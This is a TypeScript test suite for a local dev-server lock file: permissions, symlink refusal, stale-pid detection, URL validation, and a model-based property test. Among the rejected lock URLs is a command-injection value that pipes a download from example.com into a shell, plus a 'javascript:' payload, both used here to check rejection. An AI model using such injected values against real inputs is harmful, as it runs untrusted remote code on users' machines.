import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, statSync, writeFileSync } from "node:fs";
import { mkdir, readFile, symlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import fc from "fast-check";
import { DekError } from "../../src/core/error.ts";
import {
  assertNoDevServer,
  devServerUrl,
  isPidAlive,
  readDevServerLock,
  removeDevServerLock,
  writeDevServerLock,
} from "../../src/server/lock.ts";
import { propertyTest } from "../helpers/fc.ts";
import { withTempDir } from "../helpers/fs.ts";

describe("writeDevServerLock", () => {
  test("keeps the file, which may hold the --remote password, readable by its owner only", async () => {
    await withTempDir(async (root) => {
      writeDevServerLock(root, "http://127.0.0.1:9999/", "secret");
      try {
        expect(statSync(join(root, ".dek", "server.json")).mode & 0o777).toBe(0o600);
      } finally {
        removeDevServerLock(root);
      }
    });
  });

  test("never writes through a server.json a repository linked to a file elsewhere", async () => {
    await withTempDir(async (outside) => {
      await withTempDir(async (root) => {
        const victim = join(outside, "victim.json");
        await writeFile(victim, "mine", { mode: 0o644 });
        await mkdir(join(root, ".dek"));
        await symlink(victim, join(root, ".dek", "server.json"));
        expect(() => writeDevServerLock(root, "http://127.0.0.1:9999/", "secret")).toThrow(
          "leads outside the project",
        );
        expect(await readFile(victim, "utf8")).toBe("mine");
        expect(statSync(victim).mode & 0o777).toBe(0o644);
      });
    });
  });

  test("refuses to overwrite a lock whose pid is still alive", async () => {
    await withTempDir(async (root) => {
      await mkdir(join(root, ".dek"), { recursive: true });
      await writeFile(
        join(root, ".dek", "server.json"),
        `${JSON.stringify({ url: "http://127.0.0.1:5173/", pid: process.pid })}\n`,
      );

      expect(() => writeDevServerLock(root, "http://127.0.0.1:9999/")).toThrow(DekError);
      try {
        writeDevServerLock(root, "http://127.0.0.1:9999/");
      } catch (error) {
        expect(error).toBeInstanceOf(DekError);
        expect((error as DekError).message).toContain("http://127.0.0.1:5173/");
        expect((error as DekError).hint).toContain("http://127.0.0.1:5173/");
      }

      expect(readDevServerLock(root)?.url).toBe("http://127.0.0.1:5173/");
    });
  });

  test("replaces a lock whose pid is dead", async () => {
    await withTempDir(async (root) => {
      await mkdir(join(root, ".dek"), { recursive: true });
      await writeFile(
        join(root, ".dek", "server.json"),
        `${JSON.stringify({ url: "http://127.0.0.1:5173/", pid: 2_147_483_647 })}\n`,
      );

      writeDevServerLock(root, "http://127.0.0.1:9999/");
      expect(readDevServerLock(root)).toEqual({
        url: "http://127.0.0.1:9999/",
        pid: process.pid,
      });
      removeDevServerLock(root);
    });
  });

  test("refuses a second lock in the same process", async () => {
    await withTempDir(async (root) => {
      writeDevServerLock(root, "http://127.0.0.1:1/");
      expect(() => writeDevServerLock(root, "http://127.0.0.1:2/")).toThrow(DekError);
      removeDevServerLock(root);
    });
  });
});

describe("a lock a repository brings along", () => {
  const lockAt = async (root: string, lock: unknown) => {
    await mkdir(join(root, ".dek"), { recursive: true });
    await writeFile(join(root, ".dek", "server.json"), `${JSON.stringify(lock)}\n`);
  };

  test("is no lock unless it names this machine's dev server as the server writes it", async () => {
    await withTempDir(async (root) => {
      for (const url of [
        "http://127.0.0.1:9/ ; curl -s https://example.com/x | sh ; echo",
        "https://example.com/",
        "http://example.com:5173/",
        "http://127.0.0.1:5173/x",
        "http://127.0.0.1:5173/?a=b",
        "http://user@127.0.0.1:5173/",
        "http://127.0.0.1:5173",
        "http://127.0.0.1:080/",
        "javascript:alert(1)",
      ]) {
        await lockAt(root, { url, pid: process.pid });
        expect({ url, lock: readDevServerLock(root) }).toEqual({ url, lock: undefined });
        expect(() => assertNoDevServer(root)).not.toThrow();
      }
      for (const url of [
        "http://127.0.0.1:5173/",
        "http://localhost:5173/",
        "http://[::1]:5173/",
      ]) {
        await lockAt(root, { url, pid: process.pid });
        expect(readDevServerLock(root)?.url).toBe(url);
      }
    });
  });

  test("reads the lock the server writes on port 80, where the URL takes no port", async () => {
    await withTempDir(async (root) => {
      for (const url of [devServerUrl(80), "http://127.0.0.1:80/", "http://127.0.0.1/"]) {
        await lockAt(root, { url, pid: process.pid });
        expect({ url, lock: readDevServerLock(root)?.url }).toEqual({
          url,
          lock: "http://127.0.0.1/",
        });
      }
      expect(devServerUrl(5173)).toBe("http://127.0.0.1:5173/");
    });
  });

  test("never names a pid that is no process of its own as alive", () => {
    for (const pid of [0, -1, -process.pid, 1.5, Number.NaN, Number.POSITIVE_INFINITY]) {
      expect({ pid, alive: isPidAlive(pid) }).toEqual({ pid, alive: false });
    }
    expect(isPidAlive(process.pid)).toBe(true);
  });

  test("with pid 0 or -1 is no running server", async () => {
    await withTempDir(async (root) => {
      for (const pid of [0, -1]) {
        await lockAt(root, { url: "http://127.0.0.1:5173/", pid });
        expect(() => assertNoDevServer(root)).not.toThrow();
      }
    });
  });
});

/**
 * Who holds a lock file: this process, another live one, one that is gone, or a pid this user may
 * not signal (pid 1), as when a lock outlives its server and a system process takes the pid. Every
 * lock is written for its owner alone, so that last is never another user's server: dek takes it,
 * like a gone one, for a stale lock.
 */
type Holder = "self" | "live" | "dead" | "reused";

const PIDS: Record<Holder, number> = {
  self: process.pid,
  live: process.ppid,
  dead: 2_147_483_647,
  reused: 1,
};

type LockFile = { url: string; holder: Holder; password?: string; deck?: string } | "corrupt";

/** What the lock promises for each project root: the file there, and the claim this process holds. */
type LockModel = Array<{ file?: LockFile; claimed?: string }>;

type LockReal = { roots: string[] };

/** The URL of the server holding `root`, as any server about to start must see it. */
function runningAt(state: LockModel[number]): string | undefined {
  const { file } = state;
  return state.claimed ?? (typeof file === "object" && isLive(file.holder) ? file.url : undefined);
}

function isLive(holder: Holder): boolean {
  return holder === "self" || holder === "live";
}

function lockPath(root: string): string {
  return join(root, ".dek", "server.json");
}

/** What another process writes: its own lock, as writeDevServerLock writes one. */
function plant(root: string, file: Exclude<LockFile, "corrupt">): void {
  mkdirSync(join(root, ".dek"), { recursive: true });
  writeFileSync(
    lockPath(root),
    `${JSON.stringify({ url: file.url, pid: PIDS[file.holder], ...(file.deck ? { deck: file.deck } : {}) })}\n`,
  );
}

/** After each step, every root reads as the model says, and refuses a server exactly when it says. */
function lockAgrees(model: LockModel, real: LockReal): void {
  real.roots.forEach((root, at) => {
    const state = model[at] ?? {};
    const { file } = state;
    expect({ at, read: readDevServerLock(root) }).toEqual({
      at,
      read:
        typeof file === "object"
          ? {
              url: file.url,
              pid: PIDS[file.holder],
              ...(file.password ? { password: file.password } : {}),
              ...(file.deck ? { deck: file.deck } : {}),
            }
          : undefined,
    });
    const running = runningAt(state);
    const refused = (() => {
      try {
        assertNoDevServer(root);
        return undefined;
      } catch (error) {
        return (error as DekError).hint;
      }
    })();
    expect({ at, refused }).toEqual({ at, refused: running && `open ${running}` });
  });
}

type LockCommand = fc.Command<LockModel, LockReal>;

function lockCommand(
  name: string,
  check: (model: Readonly<LockModel>) => boolean,
  run: (model: LockModel, real: LockReal) => void,
): LockCommand {
  return {
    check,
    run(model, real) {
      run(model, real);
      lockAgrees(model, real);
    },
    toString: () => name,
  };
}

const rootAt = fc.nat(1);
const url = fc.nat(9).map((port) => `http://127.0.0.1:${5170 + port}/`);
const deckName = fc.option(fc.constantFrom("a", "b"), { nil: undefined });

/** This process starts a server, scoped to a deck or not: refused while any live server holds the root. */
const start = fc
  .tuple(rootAt, url, fc.option(fc.constant("secret"), { nil: undefined }), deckName)
  .map(([at, address, password, deck]) =>
    lockCommand(
      `start(${at}, ${address}${deck ? `, ${deck}` : ""})`,
      () => true,
      (model, real) => {
        const state = model[at] ?? {};
        const running = runningAt(state);
        const root = real.roots[at] ?? "";
        if (running !== undefined) {
          expect(() => writeDevServerLock(root, address, password, deck)).toThrow(
            `dev server already running at ${running}`,
          );
          return;
        }
        writeDevServerLock(root, address, password, deck);
        model[at] = { file: { url: address, holder: "self", password, deck }, claimed: address };
      },
    ),
  );

/** This process's server stops: its claim and its own file go, another's file stays. */
const stop = rootAt.map((at) =>
  lockCommand(
    `stop(${at})`,
    () => true,
    (model, real) => {
      removeDevServerLock(real.roots[at] ?? "");
      const { file } = model[at] ?? {};
      model[at] = typeof file === "object" && file.holder !== "self" ? { file } : {};
    },
  ),
);

/** Another process starts a server, as it may when it sees no live lock. */
const otherStarts = fc
  .tuple(rootAt, url, fc.constantFrom<Holder>("live"), deckName)
  .map(([at, address, holder, deck]) =>
    lockCommand(
      `other starts(${at}, ${address}, ${holder})`,
      (model) => {
        const { file } = model[at] ?? {};
        return typeof file !== "object" || !isLive(file.holder);
      },
      (model, real) => {
        const file = { url: address, holder, deck };
        plant(real.roots[at] ?? "", file);
        model[at] = { ...model[at], file };
      },
    ),
  );

/** Another process's server dies without removing its lock, which is then stale. */
const otherDies = fc.tuple(rootAt, fc.constantFrom<Holder>("dead", "reused")).map(([at, holder]) =>
  lockCommand(
    `other dies(${at}, ${holder})`,
    (model) => {
      const { file } = model[at] ?? {};
      return typeof file === "object" && file.holder === "live";
    },
    (model, real) => {
      const { file } = model[at] ?? {};
      if (typeof file === "object") {
        const stale = { ...file, holder };
        plant(real.roots[at] ?? "", stale);
        model[at] = { ...model[at], file: stale };
      }
    },
  ),
);

/** The lock file is lost or broken: deleted with `.dek`, or left half-written. */
const mangle = fc
  .tuple(rootAt, fc.constantFrom(undefined, "", "{", '{"url":1,"pid":2}', "null"))
  .map(([at, text]) =>
    lockCommand(
      `mangle(${at}, ${JSON.stringify(text)})`,
      () => true,
      (model, real) => {
        const root = real.roots[at] ?? "";
        if (text === undefined) {
          rmSync(join(root, ".dek"), { recursive: true, force: true });
        } else {
          mkdirSync(join(root, ".dek"), { recursive: true });
          writeFileSync(lockPath(root), text);
        }
        model[at] = { ...model[at], file: text === undefined ? undefined : "corrupt" };
      },
    ),
  );

describe("the dev server lock, against a model of what it promises", () => {
  // Whatever servers start and stop, in this process or another, and whatever becomes of the
  // file: one server holds a project at a time, a deck-scoped one included; a lock whose server
  // is gone, or that cannot be read, is no lock; and a server that stops leaves no lock of its own.
  propertyTest(
    "refuses and reads every root as the model says",
    fc.property(
      fc.commands([start, stop, otherStarts, otherDies, mangle], { maxCommands: 20 }),
      (commands) => {
        const roots = [0, 1].map(() => realpathSync(mkdtempSync(join(tmpdir(), "dek-lock-"))));
        try {
          fc.modelRun(() => ({ model: [{}, {}], real: { roots } }), commands);
        } finally {
          for (const root of roots) {
            removeDevServerLock(root);
            rmSync(root, { recursive: true, force: true });
          }
        }
      },
    ),
    { runs: 50 },
  );
});
